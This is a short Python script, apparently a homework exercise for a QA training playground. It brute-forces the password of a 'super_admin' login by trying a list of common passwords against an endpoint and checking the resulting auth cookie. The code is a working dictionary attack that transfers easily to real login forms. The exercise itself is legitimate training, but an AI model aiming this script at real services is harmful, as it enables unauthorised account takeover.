import requests

login = "super_admin"
passwords = ["password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567", "monkey", "111111", "letmein", "1234567890", "dragon", "baseball", "1234", "sunshine", "iloveyou", "trustno1", "princess", "adobe123[a]", "123123", "welcome", "login", "admin", "qwerty123", "solo", "1q2w3e4r", "master", "666666", "photoshop[a]", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman", "princess", "hello", "charlie", "888888", "696969", "qwertyuiop", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "dragon", "trustno1"," batman", "passw0rd", "zaq1zaq1", "qazwsx", "000000", "trustno1", "qwerty123", "123qwe"]
for my_pass in passwords:
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": login, "password": my_pass})
    my_cookie = response.cookies["auth_cookie"]
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": my_cookie})
    if response2.text != "You are NOT authorized":
        print(response2.text)
        print("Your password is:", my_pass)
        break
